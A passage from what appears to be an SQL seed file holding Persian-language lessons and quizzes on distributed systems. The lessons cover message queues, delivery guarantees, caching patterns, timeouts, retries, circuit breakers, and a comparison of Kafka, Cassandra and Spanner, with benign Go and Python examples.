گرفته‌ایم."},{"k":"h","t":"صف پیام و Pub/Sub؛ بریدن وابستگی"},{"k":"p","t":"وقتی فرستنده نمی‌خواهد صبر کند، پیام را در صف می‌گذارد و می‌رود؛ مصرف‌کننده با سرعت خودش برمی‌دارد. همین یک تصمیم، چهار چیز را با هم می‌خرد: جداسازی زمانی (مصرف‌کننده می‌تواند ساعت‌ها بعد پردازش کند)، جذب پیک (سیل لحظه‌ای در صف جمع می‌شود و مصرف‌کننده با سرعت خودش خالی می‌کند)، جداسازی خرابی (مصرف‌کننده مرد؟ پیام‌ها در صف زنده‌اند) و مقیاس‌پذیری مصرف (ده مصرف‌کننده موازی از یک صف). کافکا مدل را یک پله بالاتر برد: صف نه، «لاگ» — پیام‌ها نمی‌میرند، با offset خوانده می‌شوند و می‌توان کل تاریخچه را دوباره پخش کرد؛ همین ویژگی است که «بازسازی state» و «مصرف‌کننده جدید از اول» را ممکن می‌کند. Pub/Sub هم شکل پخشی است: یک رویداد، چند مشترک مستقل — مثل «سفارش ثبت شد» که هم موجودی می‌شنود، هم ایمیل، هم آنالیز."},{"k":"h","t":"تضمین تحویل و Backpressure"},{"k":"p","t":"سه سطح تضمین وجود دارد و هیچ سیستمی فراتر از «حداقل یک‌بار» رایگان نمی‌دهد: «حداکثر یک‌بار» یعنی ممکن است گم شود (UDPگونه)، «حداقل یک‌بار» یعنی تکراری می‌رسد (با ACK و retry — رایج‌ترین و عملی‌ترین) و «دقیقاً یک‌بار» که فقط با ترکیب حداقل‌یک‌بار و Idempotency در مقصد به دست می‌آید — کافکا با تراکنش‌هایش نزدیکش می‌شود ولی حتی آن هم در انتها به مصرف‌کننده Idempotent نیاز دارد. و روی دیگر سکه، Backpressure است: وقتی مصرف‌کننده کندتر از تولیدکننده است، سیستم باید سیگنال بدهد — صف‌ها با بزرگ‌شدن (و هشدار Consumer Lag)، RPCها با Rate Limit و Reject، و استریم‌ها با.flow Control. سیستمی که Backpressure ندارد، روزی با صفِ بی‌نهایت یا حافظه پر، به شکلی که خودش انتخاب نکرده، «حلش» می‌کند."},{"k":"h","t":"مثال حل‌شده"},{"k":"code","lang":"go","title":"مصرف‌کننده کافکا — حداقل‌یک‌بارِ درست","code":"for {\n    msg, err := consumer.ReadMessage(ctx)\n    if err != nil {\n        continue                       // کافکا خودش retry می‌کند\n    }\n\n    // ۱) پردازش + Idempotency در یک تراکنش دیتابیس\n    err = db.Exec(`\n        INSERT INTO processed (event_id, payload)\n        VALUES ($1, $2)\n        ON CONFLICT (event_id) DO NOTHING`,  // تکراری؟ بی‌اثر\n        msg.Key, msg.Value,\n    )\n    if err != nil {\n        continue                       // Commit نمی‌کنیم → دوباره می‌رسد\n    }\n\n    // ۲) فقط بعد از پردازش موفق:\n    consumer.CommitMessage(msg)\n}\n// ترتیب «پردازش، بعد Commit» یعنی حداقل‌یک‌بار؛\n// کلید event_id + ON CONFLICT یعنی تکرارش بی‌اثر است\n// → عملاً: دقیقاً یک‌بار."},{"k":"list","items":["Commit نکردن قبل از پردازش، تضمین می‌کند پیام گم نمی‌شود — اگر وسط کار بمیریم، دوباره تحویل می‌گیریم.","قیمت این تضمین، تکرار است — و ON CONFLICT DO NOTHING آن را بی‌اثر می‌کند.","ترکیب این دو — حداقل‌یک‌بار + Idempotency — همان فرمول عملی «دقیقاً یک‌بار» در دنیای واقعی است."]},{"k":"def","term":"Backpressure","t":"سیگنالی که از مصرف‌کنندهِ اشباع به تولیدکننده برمی‌گردد تا سرعتش را کم کند — مثل فشار آب در لوله. در صف‌ها به‌شکل Lag، در HTTP به‌شکل 429 و در استریم‌ها به‌شکل کنترل جریان ظاهر می‌شود. سیستم بدون Backpressure فشار را جذب نمی‌کند، فقط انباشته می‌کند تا جایی که خودش می‌شکند."},{"k":"table","head":["الگو","مدل","بهترین جا","مراقب باش"],"rows":[["RPC/gRPC","همگام، درخواست/پاسخ","مسیر بحرانی کاربر","زنجیره وابستگی و timeout"],["صف کار","ناهمگام، رقابت مصرف‌کننده‌ها","پردازش سنگین و پیک‌ها","Consumer Lag و سمی‌شدن پیام"],["Pub/Sub","یک رویداد، چند مشترک","اطلاع‌رسانی و همگام‌سازی","ترتیب و تحویلِ هر مشترک"]]},{"k":"warn","title":"دام رایج","t":"فرستادن پیام و فراموش کردنش (Fire-and-Forget) بدون هیچ نظارتی: صف‌ها را مانیتور کن — طول صف و Consumer Lag دو عدد حیاتی‌اند. صفی که فقط بزرگ می‌شود یعنی مصرف‌کننده مرده یا کندتر از تولید است؛ و پیام‌هایی که چند بار پردازش‌شان شکست می‌خورد باید به Dead-Letter Queue بروند نه این‌که صف را برای همیشه قفل کنند."},{"k":"tip","title":"نکته حرفه‌ای","t":"قانون سرانگشتی معماری: هر عملی که کاربر لازم نیست جوابش را همان لحظه ببیند (ایمیل، گزارش، همگام‌سازی جستجو، آنالیز) را پشت صف ببر و مسیر درخواست را فقط به «ثبت موفق» برسان. همین یک قاعده، پاسخ‌دهی اکثر APIها را از صدها میلی‌ثانیه به چند ده میلی‌ثانیه می‌رساند و تحمل خرابی‌شان را چند برابر می‌کند."},{"k":"h","t":"جمع‌بندی درس"},{"k":"list","items":["RPC برای مسیر بحرانی با timeout اجباری؛ هر چیز صبرکننده‌ای پشت صف.","کافکا لاگ است نه صف: offset، پخش مجدد و بازسازی state — و Pub/Sub برای پخش رویداد.","تحویل «حداقل یک‌بار» + مقصد Idempotent = دقیقاً یک‌بارِ واقعی؛ و Lag را همیشه مانیتور کن."]}]'::jsonb, '[{"q":"چرا «دقیقاً یک‌بار» رایگان به دست نمی‌آید؟","opts":["چون کند است","چون تحویلِ مطمئن نیاز به retry دارد و retry یعنی تکرار — مگر مقصد با Idempotency اثر تکرار را خنثی کند","چون TCP ضعیف است","به دست می‌آید"],"ans":1,"why":"بین «ممکن است گم شود» و «ممکن است تکرار شود» فقط دومی با نرم‌افزار قابل‌حل است؛ پس استاندارد صنعت می‌شود حداقل‌یک‌بار + مقصد Idempotent."},{"q":"Consumer Lag چیست و چرا حیاتی است؟","opts":["نسخه قدیمی مصرف‌کننده","فاصله بین جدیدترین پیام صف و جایی که مصرف‌کننده خوانده — اگر فقط بزرگ شود، یعنی مصرف عقب مانده یا مرده","خطای شبکه","تعداد مصرف‌کننده‌ها"],"ans":1,"why":"صف بزرگ‌شونده دیده نمی‌شود تا دیر شود؛ Lag عددی است که «سالم‌بودن» مصرف را نشان می‌دهد و پایه هشدارگذاری همه سیستم‌های پیامی است."},{"q":"کجا RPC همگام انتخاب درست است؟","opts":["همه‌جا","جایی که کاربر منتظر نتیجه است و بدون آن نمی‌توان پاسخ داد — مثل بررسی موجودی هنگام ثبت سفارش","هیچ‌جا","فقط داخل یک ماشین"],"ans":1,"why":"همگامی هزینه دارد (زنجیره تأخیر و خرابی) پس فقط وقتی توجیه دارد که پاسخ واقعاً همین لحظه لازم باشد؛ بقیه را پشت صف ببر."}]'::jsonb),
('ds-r8', 'dist', 'کش توزیع‌شده؛ سرعتی که مسئله‌های خودش را دارد', 60, 8, '[{"k":"p","t":"دیتابیس‌ها معمولاً زیر بار «حقایق» نمی‌میرند — زیر بار «تکرارها» می‌میرند: هزاران بار پرسیدنِ یک سوال که جوابش عوض نشده. کش این تکرارها را می‌بلعد و سرعت را ده‌ها برابر می‌کند — و بعد، مسئله‌هایی می‌سازد که همه‌شان یک نام دارند: «داده قدیمی»."},{"k":"h","t":"سه الگوی اصلی"},{"k":"p","t":"در Cache-Aside که رایج‌ترین است، برنامه خودش دو طرف را مدیریت می‌کند: اول از کش بپرس؛ اگر نبود از دیتابیس بخوان و در کش بگذار؛ و هنگام نوشتن، کش را باطل کن (نه به‌روز — این ظرافت مهم است). در Read-Through، کش جلوی دیتابیس می‌نشیند و خودش مسئول پر شدن است — برنامه فقط از کش می‌پرسد. و در Write-Through و Write-Behind، نوشتن‌ها هم از کش می‌گذرند: اولی هر نوشتن را همزمان به کش و دیتابیس می‌برد (سازگاری بالا، سرعت نوشتن پایین‌تر) و دومی در کش جمع می‌کند و دسته‌دسته به دیتابیس می‌فرستد (سرعت نوشتن عالی، ریسک از دست رفتن داده‌ای که هنوز نرسیده). انتخاب بین این‌ها مثل همه‌چیز توزیع‌شده، خریدن یک ویژگی با پول دیگری است."},{"k":"h","t":"Invalidation؛ مسئله‌ای که اسمش را بد کرده‌اند"},{"k":"p","t":"جمله معروف است: «در علوم کامپیوتر فقط دو چیز سخت است: نام‌گذاری، و باطل‌کردن کش.» مشکل واقعی این است: کش و دیتابیس دو منبع حقیقت‌اند و هماهنگ‌نگه‌داشتن‌شان هزینه دارد. سه ابزار اصلی داری: TTL (عمر زمانی — ساده و قابل‌پیش‌بینی، ولی یعنی تا پایان عمر، داده می‌تواند قدیمی باشد)، باطل‌کردن رویدادمحور (هنگام نوشتن، یک رویداد منتشر کن و همه کش‌ها کلید مربوط را حذف کنند — تازه‌تر، ولی اگر رویداد گم شود کش برای همیشه قدیمی می‌ماند) و کلیدهای نسخه‌دار (به‌جای product:42 از product:42:v7 بپرس — نسخه عوض شود، کلید قدیمی خودبه‌خود مرده است و حتی Rollback تمیز داری). در عمل ترکیب می‌کنند: TTL به‌عنوان تور ایمنیِ همیشه + باطل‌کردن رویدادمحور برای تازگی واقعی."},{"k":"h","t":"وقتی کش خودش مسئله می‌شود؛ گله و بهمن"},{"k":"p","t":"سه سناریوی ترسناک کش را بشناس. Thundering Herd: یک کلید داغ منقضی می‌شود و همزمان صد درخواست می‌بینند «نیست» و صدتایی به دیتابیس هجوم می‌برند — راه‌حل: فقط یکی برود بیاورد (Singleflight / قفل روی کلید) و بقیه چند میلی‌ثانیه صبر کنند، یا داده منقضی‌شده را موقتاً سرو کن (Stale-While-Revalidate). Cache Stampede هم‌خانواده‌اش است ولی وسیع‌تر: چند کلید مهم همزمان منقضی می‌شوند — TTLها را با کمی jitter پخش کن تا همزمان نمیرند. و Cache Avalanche: خودِ کش کلاً از دسترس خارج می‌شود و کل ترافیک روی دیتابیس خالی می‌شود — که درمانش از قبل است: دیتابیس باید بتواند «بدون کش» هم نفس بکشد (تمرینش کن!) و کلیدهای داغ در چند لایه کش شوند. قاعده طلایی: کش را همیشه «اختیاری و غیرقابل‌اعتماد» فرض کن — برنامه باید بدون کش کار کند، فقط کندتر."},{"k":"h","t":"مثال حل‌شده"},{"k":"code","lang":"go","title":"Cache-Aside با Singleflight","code":"var group singleflight.Group\n\nfunc GetProduct(ctx context.Context, id string) (*Product, error) {\n    key := \"product:\" + id\n\n    // ۱) کش اول\n    if v, ok := cache.Get(ctx, key); ok {\n        return v.(*Product), nil\n    }\n\n    // ۲) نبود؟ فقط یک goroutine برود دیتابیس —\n    //    بقیه منتظرِ نتیجه همان یکی می‌مانند (ضد گله)\n    v, err, _ := group.Do(key, func() (any, error) {\n        p, err := db.GetProduct(ctx, id)\n        if err != nil {\n            return nil, err\n        }\n        // TTL + jitter: مرگ‌های همزمان نداشته باشیم\n        cache.Set(ctx, key, p, 5*time.Minute+jitter())\n        return p, nil\n    })\n    if err != nil {\n        return nil, err\n    }\n    return v.(*Product), nil\n}"},{"k":"list","items":["ترتیب کلاسیک Cache-Aside: کش، بعد دیتابیس، بعد پرکردن کش — ولی با یک تفاوت حیاتی.","singleflight.Do تضمین می‌کند برای یک کلید، در هر لحظه فقط «یک» فراخوانی دیتابیس در جریان است — صد درخواست همزمان، یک Query.","jitter روی TTL یعنی کلیدهای هم‌سن، همزمان منقضی نمی‌شوند — پیشگیری از Stampede با یک خط کد.","دقت کن: هیچ‌جا کش «به‌روز» نمی‌شود، فقط «پر» می‌شود — به‌روزرسانی وظیفه مسیر نوشتن است (باطل‌کردن)."]},{"k":"def","term":"Stale-While-Revalidate","t":"سیاستی که می‌گوید: اگر داده کش منقضی شد، همان نسخه قدیمی را فوراً به کاربر بده و همزمان در پس‌زمینه نسخه تازه را بیاور. برای خیلی از محتواها (فید خبری، قیمت نمایشی)، ۳۰ ثانیه کهنگی با یک تجربه آنی، معامله‌ای است که کاربر با کمال میل قبول می‌کند — و دیتابیس هم از گله‌های منقضی‌شدن نجات پیدا می‌کند."},{"k":"table","head":["راهبرد نوشتن","تازگی","سرعت نوشتن","ریسک"],"rows":[["باطل‌کردن هنگام نوشتن","خوب (با رویداد: عالی)","بالا","رویداد گم شود → کش قدیمی"],["Write-Through","همیشه تازه","پایین‌تر","کش تک‌نقطه مسیر نوشتن"],["Write-Behind","با تأخیر","عالی","داده در صفِ کش گم شود"]]},{"k":"warn","title":"دام رایج","t":"ذخیره داده‌ای که «تنها کپی زنده‌اش» در کش است — مثل Session کاربر فقط در Redis. کش یک ذخیره‌ساز نیست؛ یک شتاب‌دهنده قابل‌تخلیه است. روزی که Redis ری‌استارت می‌شود (و می‌شود)، اگر داده‌ات فقط آن‌جاست، همه کاربرها بیرون می‌افتند یا بدتر، داده گم می‌شود. هر چیزی که گم‌شدنش درد دارد، باید یک کپی بادوام هم داشته باشد."},{"k":"tip","title":"نکته حرفه‌ای","t":"اول Hit Ratio را اندازه بگیر، بعد کش اضافه کن — نه برعکس. کشی که Hit Ratio زیر ۵۰٪ دارد فقط یک لایه پیچیدگی و تأخیر اضافه است. و دو عدد را همیشه مانیتور کن: Hit Ratio (سلامت کش) و P99 وقتی کش خالی است (سلامت سیستم بدون کش) — دومی را با آزمایش دوره‌ای «تخلیه کش» واقعاً بسنج، نه با حدس."},{"k":"h","t":"جمع‌بندی درس"},{"k":"list","items":["Cache-Aside با باطل‌کردن هنگام نوشتن، الگوی پیش‌فرض؛ TTL همیشه تور ایمنی.","Invalidation با سه ابزار: TTL، رویداد و کلید نسخه‌دار — معمولاً ترکیبی.","کش غیرقابل‌اعتماد است: Singleflight و jitter جلوی گله و بهمن، و برنامه باید بدون کش هم کار کند."]}]'::jsonb, '[{"q":"چرا هنگام نوشتن، «باطل‌کردن» کش رایج‌تر از «به‌روزرسانی» آن است؟","opts":["سریع‌تر است","چون به‌روزرسانی کش با ترتیب‌ها و نوشتن‌های همزمان ناسازگار می‌شود و کش قدیمیِ پنهان می‌سازد؛ حذفش همیشه درست است","کش اجازه به‌روزرسانی نمی‌دهد","فرقی ندارند"],"ans":1,"why":"وقتی دو نوشتن همزمان باشند، ممکن است ترتیب به‌روزرسانی کش با دیتابیس یکی نشود و کش «جوابِ باخت» را نگه دارد؛ ولی حذف کلید فقط یک نتیجه دارد: خواندن بعدی از منبعِ حقیقت پر می‌شود."},{"q":"Thundering Herd چه زمانی رخ می‌دهد و درمانش چیست؟","opts":["وقتی دیتابیس کند است","وقتی یک کلید داغ منقضی می‌شود و همه درخواست‌های همزمان به دیتابیس هجوم می‌برند — درمان: Singleflight یا سروِ داده کهنه","وقتی کش پر است","وقتی شبکه قطع است"],"ans":1,"why":"همه درخواست‌ها همزمان «نیست» می‌بینند و همزمان Query می‌فرستند — درست در لحظه‌ای که کلید داغ بوده. با اینکه فقط یکی بفرستیم و بقیه صبر کنند، صد Query می‌شود یک."},{"q":"جitter روی TTL چه چیزی را پیشگیری می‌کند؟","opts":["Hit Ratio را بالا می‌برد","انقضای همزمان تعداد زیادی کلید (Stampede) — چون عمرها کمی پخش می‌شوند","امنیت را","حجم کش را"],"ans":1,"why":"کلیدهایی که با هم ساخته شده‌اند با هم منقضی می‌شوند؛ چند ثانیه تصادفی روی هر TTL، مرگ‌شان را در زمان پخش می‌کند و دیتابیس یک‌باره زیر آوار نمی‌رود."}]'::jsonb),
('ds-r9', 'dist', 'طراحی برای شکست؛ Timeout، Retry و Circuit Breaker', 65, 9, '[{"k":"p","t":"در یک ماشین، خرابی «اتفاق» است؛ در صد ماشین، خرابی «برنامه روزانه» است — هر روز چند گره کند می‌شوند، چند اتصال قطع می‌شود و چند timeout می‌خوری. سوال این نیست چطور جلوگیری کنی؛ این است که وقتی رخ داد، سیستم خم شود یا بشکند."},{"k":"h","t":"Timeout؛ خط اول دفاع"},{"k":"p","t":"هر فراخوانی از راه دور باید سه زمان داشته باشد: مهلت اتصال (چقدر برای برقراری)، مهلت خواندن (چقدر برای جواب) و — مهم‌تر از همه — مهلتِ کل که از سمتِ خودت شروع می‌شود و همه retryها و لایه‌ها را در بر می‌گیرد (Deadline). بدون deadline سراسری، مهلت‌های لایه‌ای جمع می‌شوند: اگر سرویس الف به ب ۵ ثانیه مهلت بدهد و ب به ج ۵ ثانیه، کاربرِ الف ممکن است ۱۵ ثانیه منتظر بماند — و در لایه‌های عمیق‌تر، دقیقه‌ها. الگوی درست: کاربر نهایی بودجه زمانی می‌گذارد (مثلاً ۸۰۰ میلی‌ثانیه)، این بودجه با هر فراخوانی به پایین propagate می‌شود و هر لایه می‌داند چقدر از آن مانده — gRPC و OpenTelemetry این مفهوم را Deadline Propagation می‌نامند. Timeoutهایی که به بودجه کل نگاه نمی‌کنند، فقط توهم کنترل می‌دهند."},{"k":"h","t":"Retry با Backoff و Jitter؛ وقتی صبر کردن مهندسی می‌شود"},{"k":"p","t":"Retry ساده و بلافاصله، در مقیاس، حمله DDoS خودساخته است: صد کلاینت که همزمان یک بار شکست خوردند و همزمان دوباره بزنند، درست وقتی سرویس زیر فشار است فشار را دو برابر می‌کنند. راه‌حل کلاسیک، Backoff نمایی است: بار اول ۱۰۰ میلی‌ثانیه صبر، بار دوم ۲۰۰، سوم ۴۰۰ — تا یک سقف. ولی حتی این هم کافی نیست چون صدها کلاینتِ هم‌زمان، همگی در همان لحظه‌های ۱۰۰/۲۰۰/۴۰۰ برمی‌گردند؛ پس Jitter اضافه می‌کنند: هر صبر، عددی تصادفی در بازه خودش — تا موج‌های retry پخش شوند و سرویس نفس بکشد. و دو قانون طلایی: فقط عمل‌های Idempotent را retry کن (یا با کلید Idempotency) و تعداد retry را سقف بگذار — retry بی‌نهایت یعنی تبدیل «یک خطا» به «چرخه مرگ»."},{"k":"h","t":"Circuit Breaker و Bulkhead؛ قطع کردن و جداسازی"},{"k":"p","t":"فیوزبردار (Circuit Breaker) از برق‌کشی آمده: اگر یک سرویس پایین‌دست پشت‌سرهم شکست بخورد (مثلاً ۵ خطا از ۱۰)، فیوز «باز» می‌شود و مدتی (مثلاً ۳۰ ثانیه) اصلاً صدایش نمی‌زنی — بلافاصله خطای سریع برمی‌گردانی یا مسیر جایگزین می‌روی. بعد از آن مهلت، چند درخواست آزمایشی می‌فرستی (Half-Open): موفق شدند، فیوز بسته و ترافیک برمی‌گردد؛ شکست خوردند، دوباره باز. نتیجه: سرویسِ خراب فرصت پیدا می‌کند نفس بکشد و سرویسِ تو، Threadهایش را پشت یک وابستگی مرده گرو نگه نمی‌دهد. Bulkhead هم از کشتی آمده: دیواره‌های جداساز که سوراخ‌شدن یک بخش، بقیه را غرق نمی‌کند — در نرم‌افزار یعنی استخرهای جدا: اتصال‌های جدا برای هر وابستگی، صف جدا برای هر نوع کار، تا خرابی دیتابیسِ گزارش‌ها نتواند مسیر پرداخت را با خود ببرد. این الگوها با هم، Graceful Degradation را می‌سازند: وقتی یک بخش خراب است، سیستم به‌جای خاموشی کامل، با امکانات کمتر کار می‌کند."},{"k":"h","t":"مثال حل‌شده"},{"k":"code","lang":"py","title":"فیوزبردار مینیمال","code":"import time, random\n\nclass CircuitBreaker:\n    def __init__(self, fail_max=5, reset_timeout=30):\n        self.failures, self.state = 0, ''CLOSED''\n        self.fail_max, self.reset_timeout = fail_max, reset_timeout\n        self.opened_at = 0\n\n    def call(self, fn, fallback=None):\n        if self.state == ''OPEN'':\n            if time.time() - self.opened_at > self.reset_timeout:\n                self.state = ''HALF_OPEN''      # یک شانس آزمایشی\n            else:\n                return fallback()             # حتی صدا هم نزن\n        try:\n            result = fn()\n            self._on_success()\n            return result\n        except Exception:\n            self._on_failure()\n            return fallback()                 # degrade، نه crash\n\n    def _on_failure(self):\n        self.failures += 1\n        if self.failures >= self.fail_max:\n            self.state, self.opened_at = ''OPEN'', time.time()\n\n    def _on_success(self):\n        self.failures, self.state = 0, ''CLOSED''\n\n# استفاده: پیشنهادها از سرویس توصیه‌ها، ولی اگر مرده بود:\nrecs = breaker.call(lambda: reco.get(user),\n                    fallback=lambda: popular_items())"},{"k":"list","items":["سه حالت — بسته (عادی)، باز (حتی صدا نزن)، نیمه‌باز (یک شانس) — تمام منطق فیوز است.","در حالت OPEN، فراخوانی «بلافاصله» fallback می‌شود — هیچ Threadی پشت سرویس مرده منتظر نمی‌ماند.","fallback یعنی Graceful Degradation: صفحه بدون «پیشنهاد شخصی‌شده» بالا می‌آید — با کمی امکانات کمتر، ولی بالا می‌آید.","این ۲۵ خط را بفهم و بعد از کتابخانه‌های battle-tested (مثل resilience4j یا Polly) استفاده کن — جزئیات Half-Open و همزمانی‌اش تله دارد."]},{"k":"def","term":"Graceful Degradation","t":"توانایی سیستم برای ادامه کار با امکانات کمتر هنگام خرابی اجزا — به‌جای صفحه خطای کامل، صفحه‌ای بدون بخش توصیه‌ها؛ به‌جای قیمت زنده، قیمتِ کمی قدیمی‌تر. این «کمتر» را باید از قبل طراحی کرد: هر وابستگی غیرحیاتی باید fallback مشخصی داشته باشد، چون در لحظه خرابی فرصت تصمیم‌گیری نیست."},{"k":"table","head":["الگو","جلوی چه چیزی را می‌گیرد","کلید تنظیم"],"rows":[["Timeout + Deadline","قفل‌شدن منابع پشت وابستگی کند","بودجه سراسری کاربر، نه مهلت لایه‌ای"],["Retry + Backoff + Jitter","از دست رفتن خطاهای موقتی شبکه","سقف تلاش + فقط عمل Idempotent"],["Circuit Breaker","فشار بر سرویسِ در حال مرگ و اشغال Threadها","آستانه شکست و مهلت نیمه‌باز"],["Bulkhead","سرایت خرابی یک وابستگی به بقیه","استخرهای جدای اتصال و صف"]]},{"k":"warn","title":"دام رایج","t":"Retry کردن عمل غیر-Idempotent بدون کلید یکتا — کلاسیک‌ترینش: پرداختی که timeout خورد و دوباره فرستاده شد و کاربر دو بار پول داد. قبل از گذاشتن هر retry، از خودت بپرس: «اگر این دو بار اجرا شود چه می‌شود؟» اگر جواب ترسناک است، اول کلید Idempotency، بعد retry."},{"k":"tip","title":"نکته حرفه‌ای","t":"تابستان‌ها یکی دو ساعت را به «تمرین خرابی» اختصاص بده: در Staging واقعاً دیتابیس را بکش، کش را خالی کن، یک سرویس را با تأخیر ۳ ثانیه‌ای مصنوعی کند کن — و ببین سیستم چه می‌کند. اولین بار وحشتناک است چون همه‌چیز می‌ریزد؛ ولی هر خرابیِ کشف‌شده در تمرین، یک خرابیِ ۳ صبحِ جمعه نیست. نتفلیکس کل این ایده را با Chaos Monkey محصول کرد."},{"k":"h","t":"جمع‌بندی درس"},{"k":"list","items":["هر فراخوانی Deadline سراسری می‌خواهد که به پایین propagate می‌شود — نه فقط timeout لایه‌ای.","Retry یعنی Backoff نمایی + Jitter + سقف + Idempotency — هر چهار، با هم.","فیوزبردار سرویسِ مرده را قطع و Bulkhead خرابی را محصور می‌کند؛ نتیجه‌شان Degradation است نه خاموشی."]}]'::jsonb, '[{"q":"چرا Retry بلافاصله و بدون Jitter در مقیاس خطرناک است؟","opts":["کند است","چون صدها کلاینت همزمان دقیقاً وقتی سرویس زیر فشار است دوباره هجوم می‌برند و فشار را چند برابر می‌کنند — Retry Storm","امن نیست","TCP اجازه نمی‌دهد"],"ans":1,"why":"خطا یعنی سرویس همین حالا مشکل داشته؛ برگشتنِ همزمانِ همه در همان لحظه، مشکل را تشدید می‌کند. Backoff فاصله می‌اندازد و Jitter هم‌زمانی را می‌شکند."},{"q":"در حالت OPEN یک Circuit Breaker چه می‌کند؟","opts":["درخواست‌ها را در صف نگه می‌دارد","اصلاً فراخوانی نمی‌کند — بلافاصله fallback یا خطای سریع برمی‌گرداند تا بعد از مهلت، با Half-Open آزمایش کند","سرعت را کم می‌کند","به سرور دیگر می‌فرستد"],"ans":1,"why":"ارزش فیوز دقیقاً در «صدا نزدن» است: منابع تو آزاد می‌مانند و سرویسِ خراب فرصت نفس‌کشیدن پیدا می‌کند — صف‌نگه‌داشتن همان بیماری است که فیوز درمانش می‌کند."},{"q":"Deadline سراسری چه چیزی را حل می‌کند که timeout لایه‌ای حل نمی‌کند؟","opts":["امنیت را","جمع‌شدن مهلت‌ها در لایه‌های تو در تو: هر لایه می‌داند از بودجه کلِ کاربر چقدر مانده، پس پاسخ کل از بودجه کاربر رد نمی‌شود","سرعت شبکه را","حجم لاگ را"],"ans":1,"why":"با مهلت مستقلِ هر لایه، کاربر می‌تواند مجموع همه‌شان را منتظر بماند. Deadline که از سمت کاربر propagate شود، مجموع را سقف می‌کند و لایه‌های عمیق می‌دانند دیگر فرصت نیست."}]'::jsonb),
('ds-r10', 'dist', 'مطالعه موردی؛ کافکا، کاساندرا و اسپنر — سه فلسفه', 70, 10, '[{"k":"p","t":"اصول توزیع‌شده روی کاغذ خشک‌اند — تا وقتی نبینی سه سیستم واقعی، با همان اصول، سه دنیای کاملاً متفاوت ساخته‌اند. کافکا، کاساندرا و اسپنر هر کدام یک پاسخ کامل‌به‌خود به یک سوال‌اند: ترتیب، دسترس‌پذیری و سازگاری."},{"k":"h","t":"کافکا؛ لاگ به‌مثابه قلب سیستم"},{"k":"p","t":"کافکا صف نیست — «لاگ فشرده‌نشدنیِ رویدادها» است و همین یک تصمیم، همه‌چیزش را می‌سازد. Producerها رویدادها را به Topicها می‌نویسند؛ هر Topic به Partitionهایی تقسیم می‌شود (همان Sharding که یاد گرفتی — کلید پیام تعیین می‌کند کدام Partition، و ترتیب فقط داخل هر Partition تضمین است)؛ و هر Partition بین Brokerها با فاکتور تکرار (مثلاً ۳) کپی می‌شود و فقط کپی‌های همگام (ISR) حق رأی دارند — با acks=all یعنی نوشتن وقتی موفق است که همه ISR تأیید کنند. Consumerها در Groupها با هم Partitionها را تقسیم می‌کنند و هر کدام offset خودش را Commit می‌کند — پس «کجا خواندم» یک داده است که می‌توان عقب برد: مصرف‌کننده جدید از اولِ تاریخچه شروع می‌کند و state را بازسازی می‌کند. این «تاریخچه دائمی» همان چیزی است که کافکا را از یک صف به ستون فقرات رویدادمحور شرکت‌هایی مثل لینکدین و اوبر تبدیل کرد."},{"k":"h","t":"کاساندرا؛ دسترس‌پذیری به هر قیمت (تقریباً)"},{"k":"p","t":"کاساندرا از روز اول AP را انتخاب کرد: هیچ گره «ویژه‌ای» ندارد (Peer-to-Peer)، گره‌ها با پروتکل Gossip همدیگر را می‌شناسند و زنده‌بودن را با Phi Accrual Failure Detector حدس می‌زنند، داده با هش سازگار و vnodeها تقسیم می‌شود، و هر نوشتن/خواندن با Quorum قابل‌تنظیم (W و R دلخواه) — یعنی می‌توانی برای یک جدول R+W>N بگیری و برای دیگری سرعت کامل. تعارض نوشتن‌های همزمان روی گره‌های جداشده با Last-Write-Wins و زمان‌برچسب حل می‌شود — و چون ساعت دیوار قابل‌اعتماد نیست، این «زمان» در عمل یعنی آخرین نوشتنی که دیده شد، که برای مدل داده‌اش (ستون‌های مستقل، بدون تراکنش چندردیفی) کافی است. نتیجه: خوشه‌ای که از مرگ دیتاسنتر کامل هم جان سالم به در می‌برد — به‌قیمت این‌که برنامه‌ات باید با سازگاری نهایتی و LWW زندگی کند. انتخابش برای «داده‌هایی که گم‌شدن‌شان فاجعه است ولی قدیمی‌شدن‌شان نه»: لاگ سنسورها، timelineها، سبدهای رهاشده."},{"k":"h","t":"اسپنر؛ سازگاری جهانی، با ساعت اتمی"},{"k":"p","t":"گوگل مسئله معکوس را حل کرد: دیتابیسی که روی چند قاره پخش است ولی «سازگاری خارجی» می‌دهد — یعنی اگر تراکنش الف در واقعیت قبل از ب Commit شده، همه‌جا هم الف قبل از ب دیده می‌شود. ابزارش TrueTime است: در هر دیتاسنتر ساعت‌های اتمی و GPS، بازه‌ای مثل [۱۲:۰۰:۰۰٫۰۰۲ ± ۷ms] اعلام می‌کنند؛ اسپنر برای Commit، زمانی را برمی‌گزیند و آن‌قدر صبر می‌کند (Commit Wait، حدود دو برابر بازه اطمینان) که مطمئن شود هیچ تراکنش بعدی نمی‌تواند زمان قبل از آن بگیرد — ابهام فیزیکی را با چند میلی‌ثانیه صبر خرید. زیرش Paxos/Raft برای هر قرص (Tablet) و 2PC بین قرص‌ها برای تراکنش‌های توزیع‌شده. قیمتش چیست؟ پیچیدگی و تأخیری که فقط گوگل‌ها می‌پردازند — ولی درسش برای همه است: CAP حکم مطلق نیست؛ با سرمایه‌گذاری روی زیرساخت (اینجا: ساعت)، می‌توان بخشی از فضای مصالححه را خرید."},{"k":"h","t":"مثال حل‌شده"},{"k":"code","lang":"txt","title":"یک خرید، سه روایت سیستمی","code":"خرید کاربر از تهران، روی خوشه‌ای با دیتاسنترهای\nتهران، فرانکفورت و سنگاپور:\n\nکافکا   → رویداد OrderPlaced به ۱۲ Partition؛\n          مصرف‌کننده‌های موجودی، ایمیل و آنالیز هر\n          کدام با offset خودشان، با سرعت خودشان.\n          اگر ایمیل ۲ ساعت مرد؟ offset همان‌جاست.\n\nکاساندرا→ سبد کاربر در ۳ کپی (RF=3)، نوشتن با W=1:\n          کاربر پاسخ را در ۳ms می‌گیرد حتی اگر یک\n          دیتاسنتر کامل قطع باشد. تعارض دو سبد\n          همزمان؟ LWW با زمان‌برچسب.\n\nاسپنر  → موجودی انبار: تراکنش Commit-Wait می‌گیرد؛\n          ~۱۵ms بیشتر از حالت عادی طول می‌کشد ولی\n          تضمین است که هیچ‌کس در هیچ قاره‌ای، کالای\n          فروخته‌شده را موجود نمی‌بیند."},{"k":"list","items":["کافکا «جریان رویداد» را حل می‌کند: مصرف‌کننده‌های مستقل، سرعت مستقل، تاریخچه قابل‌پخش مجدد.","کاساندرا «ننوشتنِ ممنوع» را حل می‌کند: W=1 یعنی حتی با دو دیتاسنتر مرده، خرید ثبت می‌شود — و بعداً 